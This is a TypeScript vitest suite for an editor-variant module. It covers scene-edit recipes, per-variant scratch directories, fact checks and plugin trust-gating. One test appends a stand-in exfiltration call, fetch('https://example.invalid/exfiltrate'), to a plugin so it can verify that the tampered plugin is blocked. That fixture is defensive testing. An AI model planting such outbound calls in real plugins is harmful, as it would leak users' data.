import { afterEach, describe, expect, it, vi } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  VARIANT_ORDER,
  bundleOrderForVariant,
  recipeForVariant,
  readVariantFacts,
  runEditorVariant,
  runVariantMatrix,
  stagesForVariant,
  type ExecuteVariant,
  type VariantEdit,
  type VariantRunOptions,
} from '../src/session/variants.ts';
import { resetToScratch } from '../src/reset.ts';
import { REPO_ROOT } from './helpers.ts';

const cleanup: string[] = [];
afterEach(() => {
  while (cleanup.length > 0) rmSync(cleanup.pop()!, { recursive: true, force: true });
});

describe('session/variants — deterministic P0/A/B recipes', () => {
  it('keeps P0 untouched and gives A/B distinct, semantic, visible edits', () => {
    expect(VARIANT_ORDER).toEqual(['p0', 'a', 'b']);
    expect(bundleOrderForVariant('p0')).toEqual([]);
    expect(bundleOrderForVariant('a')).toEqual(['a']);
    expect(bundleOrderForVariant('b')).toEqual(['a', 'b']);
    expect(stagesForVariant('b').map((stage) => stage.bundle)).toEqual(['a', 'b']);
    expect(stagesForVariant('b')[0]?.edits).toEqual(recipeForVariant('a'));
    expect(stagesForVariant('b')[1]?.edits).toEqual(recipeForVariant('b').slice(recipeForVariant('a').length));
    expect(recipeForVariant('p0')).toEqual([]);

    expect(recipeForVariant('a')).toEqual([
      { scene: 'Menu.scene', semanticId: 'menu.title', property: 'text', value: 'Morning Shell' },
      { scene: 'Menu.scene', semanticId: 'menu.title', property: 'x', value: 207 },
    ]);
    expect(recipeForVariant('b')).toEqual([
      { scene: 'Menu.scene', semanticId: 'menu.title', property: 'text', value: 'Morning Shell' },
      { scene: 'Menu.scene', semanticId: 'menu.title', property: 'x', value: 207 },
      {
        scene: 'Menu.scene',
        semanticId: 'menu.settings',
        property: 'texture',
        value: { key: 'icon_control_confirm' },
      },
      { scene: 'Menu.scene', semanticId: 'menu.settings', property: 'x', value: 358.4 },
    ]);

    expect(recipeForVariant('b').slice(0, recipeForVariant('a').length)).toEqual(recipeForVariant('a'));
    expect(recipeForVariant('b').slice(recipeForVariant('a').length)).not.toEqual([]);
  });

  it('mints one fresh independent reset scratch per variant and executes in canonical order', async () => {
    let n = 0;
    const makeScratch = vi.fn(async () => {
      n += 1;
      return {
        scratch: `/tmp/u5-variant-${n}`,
        project: `/tmp/u5-variant-${n}/phaser-editor`,
        plugins: `/tmp/u5-variant-${n}/editor-plugins`,
        p0Hash: `sha256-p0-${n}`,
      };
    });
    const calls: VariantRunOptions[] = [];
    const execute: ExecuteVariant = async (call) => {
      calls.push(call);
      const { variant, scratch, project, p0Hash, port } = call;
      return {
        variant,
        result: 'ok',
        scratch,
        project,
        p0Hash,
        evidencePath: `${scratch}/evidence/variant-${variant}.json`,
        evidence: {
          schema: 'u5.phaser.variant/1',
          variant,
          result: 'ok',
          p0Hash,
          bundleOrder: bundleOrderForVariant(variant),
          recipe: recipeForVariant(variant),
          port,
          editServerMode: null,
          editEndpointDownProven: false,
          authority: { fresh: null, afterEditor: null, final: null },
          bundleCheckpoints: [],
          factsAfterEditor: [],
          factsAfterRestart: [],
          provenance: null,
        },
      };
    };

    const results = await runVariantMatrix({ makeScratch, execute, portBase: 19_610 });

    expect(makeScratch).toHaveBeenCalledTimes(3);
    expect(calls).toHaveLength(3);
    expect(calls.map((call) => call.variant)).toEqual(VARIANT_ORDER);
    expect(calls.map((call) => call.port)).toEqual([19_610, 19_611, 19_612]);
    expect(new Set(calls.map((call) => call.scratch)).size).toBe(3);
    expect(calls.map((call) => call.p0Hash)).toEqual([
      'sha256-p0-1',
      'sha256-p0-2',
      'sha256-p0-3',
    ]);
    expect(results.map((result) => result.variant)).toEqual(VARIANT_ORDER);
  });

  it('reads persisted semantic facts from scene authority and reports mismatches', async () => {
    const project = mkdtempSync(path.join(os.tmpdir(), 'u5-variant-facts-'));
    cleanup.push(project);
    mkdirSync(path.join(project, 'src', 'scenes'), { recursive: true });
    writeFileSync(path.join(project, 'src', 'scenes', 'Menu.scene'), JSON.stringify({
      displayList: [
        {
          id: 'menu.title',
          'Semantic.fabSemanticId': 'menu.title',
          text: 'Morning Shell',
          x: 207,
        },
      ],
    }));

    const facts = await readVariantFacts(project, recipeForVariant('a'));
    expect(facts.map((fact) => fact.matches)).toEqual([true, true]);

    const wrong: VariantEdit[] = [
      { scene: 'Menu.scene', semanticId: 'menu.title', property: 'x', value: 208 },
    ];
    expect((await readVariantFacts(project, wrong))[0]).toMatchObject({ observed: 207, matches: false });
  });

  it('fails closed before launching the Editor when the scratch is inside the repository', async () => {
    const result = await runEditorVariant({
      variant: 'p0',
      scratch: REPO_ROOT,
      project: REPO_ROOT,
      p0Hash: 'sha256-test',
      port: 19_699,
      serverBin: '/must-not-launch',
    });
    cleanup.push(result.evidencePath);

    expect(result.result).toBe('blocked');
    expect(result.code).toBe('scratch-in-repo');
    expect(result.evidencePath.startsWith(REPO_ROOT)).toBe(false);
    const written = readFileSync(result.evidencePath, 'utf8');
    expect(written).not.toContain(REPO_ROOT);
    expect(written).not.toContain(os.homedir());
  });

  it('trust-gates variant plugins before the Editor binary check', async () => {
    const cleanScratch = mkdtempSync(path.join(os.tmpdir(), 'u5-variant-trusted-'));
    cleanup.push(cleanScratch);
    const clean = await resetToScratch(cleanScratch);
    const cleanResult = await runEditorVariant({
      variant: 'a',
      scratch: clean.scratch,
      project: clean.project,
      p0Hash: clean.p0Hash,
      port: 19_697,
      serverBin: '/must-not-launch',
    });
    expect(cleanResult.code).toBe('server-not-found');

    const tamperedScratch = mkdtempSync(path.join(os.tmpdir(), 'u5-variant-tampered-'));
    cleanup.push(tamperedScratch);
    const tampered = await resetToScratch(tamperedScratch);
    const plugin = path.join(tampered.plugins, 'live-copy-preview', 'live-copy-preview.js');
    writeFileSync(plugin, `${readFileSync(plugin, 'utf8')}\nfetch('https://example.invalid/exfiltrate');\n`);
    const tamperedResult = await runEditorVariant({
      variant: 'a',
      scratch: tampered.scratch,
      project: tampered.project,
      p0Hash: tampered.p0Hash,
      port: 19_698,
      serverBin: '/must-not-launch',
    });

    expect(tamperedResult.code).toBe('blocked-untrusted-plugin');
    expect(tamperedResult.evidence.detail).toMatch(/banned API: fetch/);
    expect(tamperedResult.evidence.detail).not.toContain('example.invalid');
  });
});
